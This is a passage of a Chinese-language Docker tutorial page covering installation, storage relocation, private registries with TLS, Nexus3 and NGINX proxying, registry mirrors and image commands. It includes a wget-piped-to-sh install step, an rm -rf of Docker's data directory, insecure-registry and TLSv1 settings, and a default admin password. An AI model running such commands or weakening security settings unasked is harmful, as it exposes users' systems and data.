虚拟机(VM)是一个物理硬件层抽象,用于将一台服务器变成多台服务器。 管理程序允许多个VM在一台机器上运行。每个VM都包含一整套操作系统、一个或多个应用、必要的二进制文件和库资源,因此占用大量空间。而且VM启动也十分缓慢

虚拟机更擅长于彻底隔离整个运行环境。例如,云服务提供商通常采用虚拟机技术隔离不同的用户。
而Docker通常用于隔离不同的应用 ,例如前端,后端以及数据库。

【 Build、Ship、Run 】
Build(构建镜像):镜像就像是集装箱包括文件以及运行环境等等资源。
Ship(运输镜像):主机和仓库间运输,这里的仓库就像是超级码头一样。
Run(运行镜像):运行的镜像就是一个容器,容器就是运行程序的地方。

Docker运行过程也就是去仓库把镜像拉到本地,然后用一条命令把镜像运行起来变成容器,所以也常常将Docker称为码头工人或码头装卸工,这和Docker的中文翻译搬运工人如出一辙。

</pre>
</div>

<div id="docker_install">
<h3>Ubuntu Docker安装、卸载</h3><pre>
Docker是一个开源的商业产品,有两个版本:社区版(Community Edition,缩写为CE)和企业版(Enterprise Edition,缩写为EE)

使用脚本安装Docker及依赖包
1、获取最新版本的Docker安装包
~$ wget -qO- https://get.docker.com/ | sh
安装完成后,要以非root用户可以直接运行docker时需要执行sudo usermod -aG docker berlin75命令,然后重新登陆,否则会报错
sudo usermod -aG docker $USER

2、启动docker后台服务
~$ sudo service docker start

3、测试运行hello-world
~$ docker run hello-world

安装完成后验证是否安装成功
~$ docker version
~$ docker info

卸载docker
$ sudo apt purge docker-ce
上面的命令不会移除镜像、容器、卷或用户创建的配置文件。如果想删除所有的镜像、容器和卷,运行下面的命令手动删除用户创建的配置文件:
$ rm -rf /var/lib/docker

重启Docker
sudo service docker restart
sudo systemctl daemon-reload
sudo systemctl restart docker

【 win10子系统ubuntu WSL安装docker 】
以管理员身份运行ubuntu

要装特定版本,而不是装最新版。最新版已经证实了无法拉去镜像,因该是和内核有关系,所以默认的话安装这个版是没有任何问题的
$ sudo apt purge docker-ce
$ sudo apt update
$ sudo apt install apt-transport-https ca-certificates curl software-properties-common
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
$ sudo apt update
$ sudo apt install docker-ce=17.03.2~ce-0~ubuntu-xenial
$ echo "docker-ce hold" | sudo dpkg --set-selections     # 禁止docker-ce升级

直接这个命令重新安装一遍sudo apt-get install docker-ce=17.03.2~ce-0~ubuntu-xenial

【 查看docker手册 】
$ docker                # 查看到Docker客户端的所有命令选项
$ docker stats --help   # 查看docker command命令使用方法

【 两个修改Docker本地镜像与容器的存储位置的方法 】
默认Docker的存放位置为:/var/lib/docker,可以通过下面命令查看具体位置: sudo docker info | grep "Docker Root Dir"

1、将通过软连接来实现
首先停掉Docker服务的两种方法
systemctl restart docker
service docker stop

然后移动整个/var/lib/docker目录到目的路径:
mv /var/lib/docker /root/data/docker
ln -s /root/data/docker /var/lib/docker
这时候启动Docker时发现存储目录依旧是/var/lib/docker,但是实际上是存储在数据盘的,可以在数据盘上看到容量变化。

2、修改镜像和容器的存放路径
指定镜像和容器存放路径的参数是--graph=/var/lib/docker,只需要修改配置文件指定启动参数即可。

Docker的配置文件可以设置大部分的后台进程参数,在各个操作系统中的存放位置不一致,在Ubuntu中的位置是:/etc/default/docker

Ubuntu添加下面这行(因为Ubuntu默认没开启selinux):
OPTIONS=--graph="/root/data/docker" -H fd://
# 或者
DOCKER_OPTS="-g /root/data/docker"
最后重新启动,Docker的路径就改成/root/data/docker

echo "DOCKER_OPTS=\"-g /mnt/e/wsl/docker\"" >> /etc/default/docker

</pre>
</div>

<div id="docker_repository">
<h3>仓库(Repository)——集中存放镜像文件的地方</h3><pre>
镜像构建完成后可以很容易的在当前宿主机上运行,但如果需要在其它服务器上使用这个镜像就需要Docker Registry集中的存储、分发镜像的服务
镜像仓库是Docker用来集中存放镜像文件的地方,类似于常用的代码仓库
注册服务器(Registry)是管理仓库的具体服务器,每个服务器上可以有多个仓库(Repository),而每个仓库下面有多个镜像。
每个仓库可以包含多个标签(Tag),每个标签对应一个镜像
仓库可以被认为是一个具体的项目或目录,例如对于仓库地址dl.dockerpool.com/ubuntu来说,dl.dockerpool.com是注册服务器地址,ubuntu是仓库名

通常一个仓库会包含同一个软件不同版本的镜像,而标签就常用于对应该软件的各个版本,可以通过<仓库名>:<标签>的格式来指定具体是这个软件哪个版本的镜像,如果不给出标签将以latest作为默认标签

Docker Registry公开服务和私有Docker Registry的概念:
Docker Registry公开服务是开放给用户使用、允许用户管理镜像的Registry服务。一般这类公开服务允许用户免费上传、下载公开的镜像,并可能提供收费服务供用户管理私有镜像。

最常使用的Registry公开服务是官方维护的公共仓库Docker Hub,这也是默认的Registry,拥有大量的高质量的官方镜像,大部分需求都可通过Docker Hub直接下载镜像来实现
网址hub.docker.com/,在国内访问Docker Hub可能会比较慢,国内也有一些云服务商提供类似于Docker Hub的公开服务。

https://cloud.docker.com免费注册一个Docker账号
可以通过执行docker login命令交互式的输入用户名及密码来完成在命令行界面登录Docker Hub,可以通过docker logout退出登录

Docker也在github上将docker registry项目开源,让用户可以部署完全私有的镜像管理系统
docker registry将认证与镜像管理分开,用户可以设计自己的索引服务
Docker为了适应各种部署需要,提供了S3、云文件、本地文件存储等各种存储后台

为了满足以上需求,Docker为镜像管理设计了以下几个概念:
1、Index索引,Docker在索引服务中实现用户的授权与认证、镜像的CheckSum管理以及公共命名空间的管理;
2、Docker通过Registry,将版本管理、依赖管理、数据存储和授权认证分隔开,从而能够实现上面所提到的官方、镜像、私有和自认证等各种不同类型的服务。
3、Repostory仓库,Docker中的仓库与Github的仓库概念相同。在Registry上创建仓库,并在仓库中保存、记录和管理镜像与标签。
4、Image镜像,Docker的镜像是仓库在运行环境下的一个实例。当然也可以创建一个镜像不对应任何仓库,比如同样可以在本地为自己的image命名为zhangpeihao/learningdocker,但是无法提交到Registry,因为Registry需要提交者拥有仓库zhangpeihao/learningdocker的权限。
5、Tag标签,Docker提供标签来实现在一个仓库的不同版本。
6、Layer层,Docker的镜像是在基础镜像之上进行扩充和修改,包括基础镜像在内,每个扩充和修改都被看做一个层。在数据保存上,层只保存扩充和修改的部分。
7、Container容器,Docker容器是一个镜像个运行实例。容器在image之上增加了可写层。当在容器中修改了一个文件,那么Docker会先从镜像中把文件复制到可写层,然后在可写层对文件进行修改。

Docker通过将功能模块化、镜像层次化来满足Docker的各种功能和性能上的需求
root /var/www/html

【 私有仓库 】
除了使用公开服务外,用户还可以在本地搭建私有Docker Registry
Docker官方提供了Docker Registry镜像,可以直接使用做为私有Registry服务。开源的Docker Registry镜像只提供了Docker Registry API的服务端实现,足以支持Docker命令,不影响使用。但不包含图形界面以及镜像维护、用户管理、访问控制等高级功能。

docker-registry是官方提供的工具,可以用于构建私有的镜像仓库

安装运行docker-registryv2.x版本
这将使用官方的registry镜像来启动私有仓库,默认情况下仓库会被创建在容器的/var/lib/registry目录下
$ docker run -d -p 5000:5000 --restart=always --name registry registry   # 通过获取官方registry镜像来运行容器
$ docker run -d -p 5000:5000 -v /opt/data/registry:/var/lib/registry registry  # 将镜像文件存放在本地的指定路径

在私有仓库上传、搜索、下载镜像
创建好私有仓库之后就可以使用docker tag来标记一个镜像,然后推送它到仓库,例如私有仓库地址为127.0.0.1:5000

$ docker tag ubuntu:latest 127.0.0.1:5000/ubuntu:latest  # 将ubuntu:latest镜像标记为127.0.0.1:5000/ubuntu:latest
$ docker push 127.0.0.1:5000/ubuntu:latest    # 使用docker push上传标记的镜像
$ curl 127.0.0.1:5000/v2/_catalog             # 用curl查看仓库中的镜像
{"repositories":["ubuntu"]}                   # 表明镜像已经被成功上传了

先删除已有镜像,再尝试从私有仓库中下载这个镜像。
$ docker image rm 127.0.0.1:5000/ubuntu:latest
$ docker pull 127.0.0.1:5000/ubuntu:latest

如果不想使用127.0.0.1:5000作为仓库地址,比如想让本网段的其他主机也能把镜像推送到私有仓库,就得把例如192.168.199.100:5000这样的内网地址作为私有仓库地址,这时会发现无法成功推送镜像。
这是因为Docker默认不允许非HTTPS方式推送镜像,可通过Docker的配置选项来取消这个限制或配置能够通过HTTPS访问的私有仓库

Ubuntu16.04+, Debian8+, centos7
对于使用systemd的系统,请在/etc/docker/daemon.json中写入如下内容(如果文件不存在请新建该文件)

{
  "registry-mirror": [ "https://registry.docker-cn.com" ],
  "insecure-registries": [ "192.168.199.100:5000" ]
}

【 私有仓库高级配置 】
之前搭建了一个具有基础功能的私有仓库,现在使用Docker Compose搭建一个拥有权限认证、TLS的私有仓库。
新建一个文件夹,以下步骤均在该文件夹中进行

1、准备站点证书
如果拥有一个域名,国内各大云服务商均提供免费的站点证书。也可以使用openssl自行签发证书。
假设将要搭建的私有仓库地址为docker.domain.com,以下使用openssl自行签发docker.domain.com的站点SSL证书

第一步创建CA私钥
$ openssl genrsa -out "root-ca.key" 4096

第二步利用私钥创建CA根证书请求文件
$ openssl req \
          -new -key "root-ca.key" \
          -out "root-ca.csr" -sha256 \
          -subj '/C=CN/ST=Shanxi/L=Datong/O=Your Company Name/CN=Your Company Name Docker Registry CA'
以上命令中-subj参数里的/C表示国家,如CN;/ST表示省;/L表示城市或者地区;/O表示组织名;/CN通用名称。

第三步配置CA根证书,新建root-ca.cnf
[root_ca]
basicConstraints = critical,CA:TRUE,pathlen:1
keyUsage = critical, nonRepudiation, cRLSign, keyCertSign
subjectKeyIdentifier=hash

第四步签发根证书
$ openssl x509 -req  -days 3650  -in "root-ca.csr" \
               -signkey "root-ca.key" -sha256 -out "root-ca.crt" \
               -extfile "root-ca.cnf" -extensions \
               root_ca

第五步生成站点SSL私钥
$ openssl genrsa -out "docker.domain.com.key" 4096

第六步使用私钥生成证书请求文件
$ openssl req -new -key "docker.domain.com.key" -out "site.csr" -sha256 \
          -subj '/C=CN/ST=Shanxi/L=Datong/O=Your Company Name/CN=docker.domain.com'

第七步配置证书,新建site.cnf文件
[server]
authorityKeyIdentifier=keyid,issuer
basicConstraints = critical,CA:FALSE
extendedKeyUsage=serverAuth
keyUsage = critical, digitalSignature, keyEncipherment
subjectAltName = DNS:docker.domain.com, IP:127.0.0.1
subjectKeyIdentifier=hash

第八步签署站点SSL证书
$ openssl x509 -req -days 750 -in "site.csr" -sha256 \
    -CA "root-ca.crt" -CAkey "root-ca.key"  -CAcreateserial \
    -out "docker.domain.com.crt" -extfile "site.cnf" -extensions server
这样已经拥有了docker.domain.com的网站SSL私钥docker.domain.com.key和SSL证书 docker.domain.com.crt。

新建ssl文件夹并将docker.domain.com.key docker.domain.com.crt这两个文件移入,删除其他文件。

2、配置私有仓库
私有仓库默认的配置文件位于/etc/docker/registry/config.yml,先在本地编辑config.yml,之后挂载到容器中。

version: 0.1
log:
  accesslog:
    disabled: true
  level: debug
  formatter: text
  fields:
    service: registry
    environment: staging
storage:
  delete:
    enabled: true
  cache:
    blobdescriptor: inmemory
  filesystem:
    rootdirectory: /var/lib/registry
auth:
  htpasswd:
    realm: basic-realm
    path: /etc/docker/registry/auth/nginx.htpasswd
http:
  addr: :443
  host: https://docker.domain.com
  headers:
    X-Content-Type-Options: [nosniff]
  http2:
    disabled: false
  tls:
    certificate: /etc/docker/registry/ssl/docker.domain.com.crt
    key: /etc/docker/registry/ssl/docker.domain.com.key
health:
  storagedriver:
    enabled: true
    interval: 10s
threshold: 3

生成http认证文件
$ mkdir auth
$ docker run --rm --entrypoint htpasswd registry -Bbn 用户名username 密码password > auth/nginx.htpasswd

编辑docker-compose.yml
version: '3'

services:
  registry:
    image: registry
    ports:
      - "443:443"
    volumes:
      - ./:/etc/docker/registry
      - registry-data:/var/lib/registry

volumes:
  registry-data:

修改hosts
编辑/etc/hosts
127.0.0.1 docker.domain.com

启动
$ docker-compose up -d
这样就搭建好了一个具有权限认证、TLS的私有仓库,接下来测试其功能是否正常。

3、测试私有仓库功能
$ docker login docker.domain.com  # 登录到私有仓库
$ docker pull ubuntu:17.10
$ docker tag ubuntu:17.10 docker.domain.com/username/ubuntu:17.10
$ docker push docker.domain.com/username/ubuntu:17.10
$ docker image rm docker.domain.com/username/ubuntu:17.10
$ docker pull docker.domain.com/username/ubuntu:17.10

如果退出登录,尝试推送镜像。
$ docker logout docker.domain.com
$ docker push docker.domain.com/username/ubuntu:17.10
no basic auth credentials
发现会提示没有登录,不能将镜像推送到私有仓库中。

如果本机占用了443端口,可以配置Nginx代理

【 Nexus3.x的私有仓库 】
使用Docker官方的Registry创建的仓库面临一些维护问题。比如某些镜像删除以后空间默认是不会回收的,需要一些命令去回收空间然后重启Registry程序。在企业中把内部的一些工具包放入Nexus中是比较常见的做法,最新版本Nexus3.x全面支持Docker的私有镜像。所以使用Nexus3.x一个软件来管理Docker,Maven,Yum,PyPI等是一个明智的选择。

启动Nexus容器
$ docker run -d --name nexus3 --restart=always -p 8081:8081 \
    --mount src=nexus-data,target=/nexus-data \
    sonatype/nexus3
等待3-5分钟,如果nexus3容器没有异常退出,那么可以使用浏览器打开http://YourIP:8081访问Nexus了。
第一次启动Nexus的默认帐号是admin密码是admin123 登录以后点击页面按钮进行设置。

创建仓库
创建一个私有仓库的方法: Repository->Repositories 点击右边菜单 Create repository 选择 docker(hosted)

Name: 仓库的名称
HTTP: 仓库单独的访问端口
Enable Docker V1 API: 如果需要同时支持V1版本请勾选此项(不建议勾选)
Hosted -> Deployment pollcy: 请选择Allow redeploy否则无法上传Docker镜像
其它的仓库创建方法请各位自己摸索,还可以创建一个docker(proxy)类型的仓库链接到DockerHub上。再创建一个docker(group)类型的仓库把刚才的hosted与proxy添加在一起。主机在访问的时候默认下载私有仓库中的镜像,如果没有将链接到DockerHub中下载并缓存到Nexus中。

添加访问权限
菜单Security->Realms把Docker Bearer Token Realm移到右边的框中保存。

添加用户规则:菜单Security->Roles->Create role在Privlleges选项搜索docker把相应的规则移动到右边的框中然后保存。

添加用户:菜单Security->Users->Create local user在Roles选项中选中刚才创建的规则移动到右边的窗口保存。

NGINX加密代理
证书的生成请参见私有仓库高级配置

NGINX示例配置如下
upstream register
{
  server "YourHostName OR IP":5001; #端口为上面添加的私有镜像仓库是设置的 HTTP 选项的端口号
  check interval=3000 rise=2 fall=10 timeout=1000 type=http;
  check_http_send "HEAD / HTTP/1.0\r\n\r\n";
  check_http_expect_alive http_4xx;
}

server {
  server_name YourDomainName;#如果没有 DNS 服务器做解析,请删除此选项使用本机 IP 地址访问
  listen       443 ssl;

  ssl_certificate key/example.crt;
  ssl_certificate_key key/example.key;

  ssl_session_timeout  5m;
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  ssl_ciphers  HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers   on;
  large_client_header_buffers 4 32k;
  client_max_body_size 300m;             # 限制上传文件的大小
  client_body_buffer_size 512k;
  proxy_connect_timeout 600;
  proxy_read_timeout   600;
  proxy_send_timeout   600;
  proxy_buffer_size    128k;
  proxy_buffers       4 64k;
  proxy_busy_buffers_size 128k;
  proxy_temp_file_write_size 512k;

  location / {
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-Port $server_port;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection $connection_upgrade;
    proxy_redirect off;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_pass http://register;
    proxy_read_timeout 900s;
  }
  error_page   500 502 503 504  /50x.html;
}
Docker 主机访问镜像仓库

如果不启用SSL加密可以通过前面章节的方法添加信任地址到Docker的配置文件中然后重启Docker

使用SSL加密以后程序需要访问就不能采用修改配置的访问了。具体方法如下:
$ openssl s_client -showcerts -connect YourDomainName OR HostIP:443 < /dev/null 2 > /dev/null|openssl x509 -outform PEM >ca.crt
$ cat ca.crt | sudo tee -a /etc/ssl/certs/ca-certificates.crt
$ systemctl restart docker
使用docker login YourDomainName OR HostIP进行测试,用户名密码填写上面Nexus中生成的。

</pre>
</div>

<div id="docker_image">
<h3>镜像(Image) 特殊的文件系统</h3><pre>
操作系统分为内核和用户空间,Linux内核启动后会挂载root文件系统为其提供用户空间支持,而Docker镜像就相当于是一个root文件系统

Docker镜像是一个特殊的文件系统,除了提供容器运行时所需的程序、库、资源、配置等文件外,还包含了一些为运行时准备的一些配置参数(如匿名卷、环境变量、用户等)。镜像不包含任何动态数据,其内容在构建之后也不会被改变。

分层存储
因为镜像包含操作系统完整的root文件系统,其体积往往是庞大的,因此在Docker设计时就充分利用Union FS的技术,将其设计为分层存储的架构。所以严格来说镜像并非是像一个ISO那样的打包文件,镜像只是一个虚拟的概念,其实际体现并非由一个文件组成,而是由一组文件系统组成,或者说由多层文件系统联合组成。

镜像构建时会一层层构建,前一层是后一层的基础。每一层构建完就不会再发生改变,后一层上的任何改变只发生在自己这一层。比如删除前一层文件的操作,实际不是真的删除前一层的文件,而是仅在当前层标记为该文件已删除。在最终容器运行的时候,虽然不会看到这个文件,但是实际上该文件会一直跟随镜像。因此在构建镜像的时候需要额外小心,每一层尽量只包含该层需要添加的东西,任何额外的东西应该在该层构建结束前清理掉。

分层存储的特征还使得镜像的复用、定制变的更为容易,甚至可以用之前构建好的镜像作为基础层,然后进一步添加新的层,以定制自己所需的内容,构建新的镜像

Docker把应用程序及其依赖打包在image文件里面,只有通过这个文件才能生成Docker容器。image文件可以看作是容器的模板。Docker根据image文件生成容器的实例。同一个image文件,可以生成多个同时运行的容器实例。

image是二进制文件。实际开发中一个image文件往往通过继承另一个image文件,加上一些个性化设置而生成。举例来说可以在Ubuntu的image基础上,往里面加入Apache服务器,形成你的image

当运行容器时使用的镜像如果在本地中不存在,docker就会自动从docker镜像仓库中下载,默认是从Docker Hub公共镜像源下载

【 国内镜像加速 】
image文件是通用的,一台机器的image文件拷贝到另一台机器照样可以使用。
一般为了节省时间,应该尽量使用别人制作好的image文件,即使要定制也应该基于别人的image文件进行加工,而不是从零开始制作。为了方便共享,image文件制作完成后可以上传到网上的仓库,也可以出售自己制作的image文件

Docker的官方仓库Docker Hub(https://hub.docker.com/)是最重要、最常用的image仓库。
国内连接Docker的官方仓库很慢甚至断线,需要将默认仓库改成国内的镜像网站https://www.docker-cn.com/registry-mirror

$ docker pull registry.docker-cn.com/library/ubuntu:16.04

配置Docker守护进程默认使用Docker官方镜像加速,这样可以默认通过官方镜像加速拉取镜像,而无需在每次拉取时指定registry.docker-cn.com。
可以在Docke守护进程启动时传入--registry-mirror参数:
$ docker --registry-mirror=https://registry.docker-cn.com daemon

配置国内源
推荐daocloud.io及aliyun的加速器,配置步骤登录对应的账号后根据其文档进行配置即可
https://registry.docker-cn.com  // Docker中国区官方镜像
https://www.daocloud.io/mirror
http://hub-mirror.c.163.com  // 网易
https://docker.mirrors.ustc.edu.cn  // ustc 
https://docker.mirrors.ustc.edu.cn // 中国科技大学
https://cr.console.aliyun.com/  // 阿里云容器服务,首页“创建我的容器镜像”得到一个专属的镜像加速地址类似于“https://1234abcd.mirror.aliyuncs.com”

默认的配置文件是/etc/default/docker,不存在时手动创建,修改保存后重启Docker以使配置生效
echo "DOCKER_OPTS=\"--registry-mirror=https://registry.docker-cn.com\"" | sudo tee -a /etc/default/docker // Docker中国区官方镜像
echo "DOCKER_OPTS=\"--registry-mirror=https://www.daocloud.io/mirror\"" | sudo tee -a /etc/default/docker

Ubuntu14.04等发行版默认的配置文件是/etc/docker/daemon.json,不存在时手动创建,修改保存后重启Docker以使配置生效
{
"registry-mirrors": ["https://registry.docker-cn.com"]
}

从Docker Hub下载镜像需要经过认证、查询和下载等步骤
一、Docker客户端向Docker Hub的索引服务发送镜像查询请求。 GET /vi/repositories/zhangpeihao/busybox/images
二、Docker Hub的索引服务通过查找数据库,找到该仓库的所有镜像的ID和CheckSum返回给Docker客户端。可以通过命令直接调用Docker Hub的REST API接口:
curl -v -L -u<用户名>:<密码>-H "X-Docker-Token: true" -H "Accept: application/json" https://index.docker.io/v1/repositories/zhangpeihao/busybox/images
在返回中可以找到X-Docker-Endpoints头字段表示Registry服务所在的Host地址;X-Docker-Token头字段表示访问registry需要的认证信息和授权;返回的内容是所查询镜像的所有依赖的层镜像的ID和CheckSum。事实上现在从Docker Hub取得的CheckSum都是空的,这个信息可以通过Registry的images接口直接获得。
三、Docker客户端使用得到的认证信息和Registry Host地址,向Registry发送下载镜像请求。
四、Registry向Docker Hub的索引服务发送验证请求,验证Docker客户端提供的认证信息是否被授权访问指定的镜像。
五、Docker Hub的索引服务返回验证结果。
六、如果Docker Hub的索引服务返回验证通过,Registry则开始响应Docker客户端的镜像下载请求

【 搜索镜像 】
docker search [OPTIONS] TERM

OPTIONS说明:
--automated      只列出automated build类型的镜像,automated资源允许用户验证镜像的来源和内容
--no-trunc       显示完整的镜像描述
-s               列出收藏数不小于指定值的镜像
--filter=stars=N 参数可以指定仅显示收藏数量为N以上的镜像

根据是否是官方提供可将镜像资源分为两类
一种是类似centos的镜像被称为基础镜像或根镜像,由Docker公司创建、验证、支持、提供,往往使用单个单词作为名字
还有一种类型,比如tianon/centos镜像,是由Docker的用户创建并维护的,往往带有用户名称前缀,可通过前缀username/来指定使用某个用户提供的镜像

~$ docker search centos   # 搜索centos关键词寻找适合的镜像来作为web服务,OFFICIAL是否docker官方发布,automated自动化

【 拉取镜像 】
docker pull [选项] [Docker Registry地址[:端口号]/]仓库名[:标签]
仓库地址:地址的格式一般是<域名/IP>[:端口号],默认地址是Docker Hub
仓库名:两段式名称,即<用户名>/<软件名>。对于Docker Hub,如果不给出用户名则默认为library,即官方镜像

Docker命令行客户端并行的下载了很多个层(layer),镜像是通过将这些层串联起来得到的
从下载过程中可以看到分层存储,镜像是由多层存储所构成。下载也是一层层的去下载,并非单一文件。下载过程中给出了每一层的ID的前12位。并且下载结束后,给出该镜像完整的sha256的摘要,以确保下载一致性
有了镜像后就能够以这个镜像为基础启动并运行一个容器

~$ docker pull httpd                # 下载镜像,将image文件从仓库抓取到本地
~$ docker pull library/hello-world
~$ docker pull hello-world
~$ docker pull ubuntu:13.10

关于Docker中latest标签
通常有两种方式来对镜像打标签:使用docker tag命令或在执行docker build的时候用-t来传递参数。在这两种情况下参数的形式通常是repository_name:tag_name,如:docker tag myrepo:mytag。如果这个资源库被上传到了Docker Hub,资源库的名字会加上一个由Docker Hub用户名和斜线组成的前缀,例如:amouat/myrepo:mytag。如果没有添加tag部分的参数,例如:docker tag myrepo:1.0 myrepo,Docker会自动的给它latest标签

不能因为镜像的标签是latest就认为这是资源库中最新的镜像。只有这个资源库的拥有者约定这样,拥有latest标签的镜像才一定是最新的镜像

latest标签不会自动更新,如果获取一个带有latest标签的镜像,Docker不会在每次运行之前去检查它是不是最新的版本。就像其它的标签一样,需要去手工决定Docker获取最新版本的镜像

【 查看本地主机上的镜像 】
$ docker image ls               # 列出本地主机上的镜像
$ docker images                 # 列出本地主机上的顶级镜像
$ docker images -a              # 列出包含依赖的中间层镜像,Docker会利用中间层镜像来加速镜像构建、重复利用资源
$ docker images ubuntu          # 列出本机的所有ubuntu image文件
$ docker images ubuntu:15.04    # 列出本机的所有ubuntu:15.04 image文件

$ docker images -f since=mongo:3.2                # 使用过滤器来列出在mongo:3.2之后建立的镜像
$ docker images -f before=mongo:3.2               # 使用过滤器来列出在mongo:3.2之前建立的镜像
$ docker images -f label=com.example.version=0.1  # 如果镜像构建时定义了LABEL,还可以通过LABEL来过滤

$ docker images -q                     # 把所有镜像的ID列出来交给docker image rm命令作为参数来删除指定的镜像
$ docker images -qf before=mongo:3.2   # 过滤之后显示镜像的ID
$ docker images --format "{{.ID}}: {{.Repository}}"                 # 用Go的模板语法列出只包含镜像ID和仓库名
$ docker images --format "table {{.ID}}\t{{.Repository}}\t{{.Tag}}" # 自定义列

$ docker images --digests       # 列出本地主机上的镜像输出镜像的摘要信息
REPOSITORY TAG  DIGEST                                                                   IMAGE ID
node       slim sha256:b4f0e0bdeb578043c1ea6862f0d40cc4afe32a4a582f3be235a3b164422be228  6e0c4c8e3913

各个字段说明:
REPOSITORY:表示镜像的仓库源
TAG:镜像的标签
IMAGE ID:镜像ID
CREATED:镜像创建时间
SIZE:镜像大小,所占用的空间

Docker Hub中显示的体积是压缩后的体积。在镜像下载和上传过程中镜像是保持着压缩状态的,因此Docker Hub所显示的大小是网络传输中更关心的流量大小。
docker images显示的是镜像下载到本地后展开的大小,准确说是展开后的各层所占空间的总和,因为镜像到本地后,查看空间的时候更关心的是本地磁盘空间占用的大小

docker images列表中的镜像体积总和并非是所有镜像实际硬盘消耗。由于Docker镜像是多层存储结构,并且可以继承、复用,因此不同镜像可能会因为使用相同的基础镜像,从而拥有共同的层。由于Docker使用Union FS,相同的层只需要保存一份即可,因此实际镜像硬盘占用空间很可能要比这个列表镜像大小的总和要小的多

$ docker system df        # 查看镜像、容器、数据卷所占用的空间

镜像ID是镜像的唯一标识和摘要,一个镜像可以对应多个标签
同一仓库源可以有多个TAG,代表这个仓库源的不同个版本
如果不指定一个镜像的版本标签,例如只使用ubuntu,docker将默认使用ubuntu:latest镜像
$ docker run -t -i ubuntu:15.10 /bin/bash   # 使用版本为15.10的ubuntu系统镜像来运行容器
$ docker run -t -i ubuntu:14.04 /bin/bash   # 使用版本为14.04的ubuntu系统镜像来运行容器

docker history [OPTIONS] IMAGE  # 查看指定镜像的创建历史
OPTIONS说明:
-H :以可读的格式打印镜像大小和日期,默认为true;
--no-trunc :显示完整的提交记录;
-q :仅列出提交记录ID。

$ docker history runoob/ubuntu:v3

【 删除本地镜像文件 】
$ docker image rm [选项] <镜像1> [<镜像2> ...]
其中镜像可以是镜像短ID、镜像长ID、镜像名或镜像摘要,更精确的是使用镜像摘要删除镜像
docker images默认列出的是短ID,一般取前3个字符以上,只要足够区分于别的镜像

$ docker rm --help
Usage:  docker rm [OPTIONS] IMAGE [IMAGE...]
Remove one or more images
Options:
  -f, --force      Force removal of the image
      --no-prune   Do not delete untagged parents

$ docker image rm imageName     # 镜像名
$ docker image rm redis:alpine  # 用镜像名也就是<仓库名>:<标签>来删除镜像
$ docker image rm 501           # 镜像ID取短ID前三位
$ docker image rm node@sha256:b4f0e0bdeb578043c1ea6862f0d40cc4afe32a4a582f3be235a3b164422be228  # 镜像摘要

用docker images -q命令来配合实现批量删除镜像
$ docker image rm $(docker images -q redis)
$ docker image rm $(docker images -q -f before=mongo:3.2)

删除行为分为两类,一类是Untagged,另一类是Deleted
删除镜像的时候实际上是在要求删除某个标签的镜像,所以首先需要做的是将满足要求的所有镜像标签都取消,这就是看到的Untagged的信息。因为一个镜像可以对应多个标签,因此当删除了所指定的标签后,可能还有别的标签指向了这个镜像,如果是这种情况那么Delete行为就不会发生。所以并非所有的docker image rm都会产生删除镜像的行为,有可能仅仅是取消了某个标签而已。

当该镜像所有的标签都被取消了,该镜像很可能会失去了存在的意义,因此会触发删除行为。镜像是多层存储结构,因此在删除的时候也是从上层向基础层方向依次进行判断删除。镜像的多层结构让镜像复用变的非常容易,因此很有可能某个其它镜像正依赖于当前镜像的某一层。这种情况依旧不会触发删除该层的行为。直到没有任何层依赖当前层时才会真实的删除当前层。这就是为什么有时候明明没有别的标签指向这个镜像,但是它还是存在的原因,也是为什么有时候会发现所删除的层数和自己docker pull看到的层数不一样的源。

除了镜像依赖以外,还需要注意的是容器对镜像的依赖。如果有用这个镜像启动的容器存在(即使容器没有运行),那么同样不可以删除这个镜像。容器是以镜像为基础,再加一层容器存储层,组成这样的多层存储结构去运行的。因此该镜像如果被这个容器所依赖的,那么删除必然会导致故障。如果这些容器是不需要的,应该先将它们删除,然后再来删除镜像。

【 推送镜像 】
用户也可以在登录后通过 docker push命令来将自己的镜像推送到Docker Hub
$ docker tag ubuntu:17.10 username/ubuntu:17.10
$ docker image ls
$ docker push username/ubuntu:17.10
$ docker search username

【 自动创建Automated Builds 】
在使用Docker镜像过程中,经常需要构建自己的镜像,而每一次docker build的漫长等待都非常耗费时间,而且面对一些大型镜像的编译工作还需要服务器有足够的硬件性能,这对普通用户来说是个不小的门槛与负担。
因此可以利用Docker Hub或Docker Cloud来自动构建镜像,解放双手,也节省了一笔服务器费用

自动创建(Automated Builds)功能对于需要经常升级镜像内程序来说十分方便
有时候用户创建了镜像,安装了某个软件,如果软件发布新版本则需要手动更新镜像。
使用第三方docker服务来帮助编译镜像,可以在互联网上面直接拉取到镜像,减少了繁琐的编译过程

而自动创建允许用户通过Docker Hub指定跟踪一个目标网站(目前支持GitHub或BitBucket)上的项目,一旦项目发生新的提交或创建新的标签tag,Docker Hub会自动构建镜像并推送到Docker Hub中。

要配置自动创建,包括如下的步骤:
1、创建并登录Docker Hub以及目标网站
2、在目标网站中连接帐户到Docker Hub
3、在Docker Hub中配置一个自动创建
4、选取一个目标网站中的项目(需要含Dockerfile)和分支
5、指定Dockerfile的位置并提交创建

配置自动创建之后就可以在Docker Hub的自动创建页面中跟踪每次创建的状态

1、创建自动构建仓库
docker hub -> 创建 -> create Automated Build
2、需要连接GitHub或Bitbucket,基于GitHub进行以下操作
3、设置Docker Hub对GitHub账户的有读和写的权限
4、登录GitHub账户进行授权
5、账户关联后需要在点击Create Automated Build创建(第一步创建自动构建仓库),然后选择Create GitHub,再根据目前需求选择要构建的Git仓库
6、如果Dockerfile在根目录则不需要特别处理,否则需要点击Click here to customize配置Dockerfile路径,Create之后会自动跳转到当前创建的仓库
7、设置Docker Hub在GitHub仓库push代码的时候自动根据dockerfile构建镜像
8、存储库链接可让您将一个自动编译链接与另一个链接。如果一个自动构建得到更新,Docker会触发另一个构建。这可以很容易地确保相关图像保持同步。您可以链接多个图像存储库。您只需链接两个相关版本的一侧。连接双方导致无尽的构建循环。
添加链接:
(1)转到自动构建存储库的构建设置。
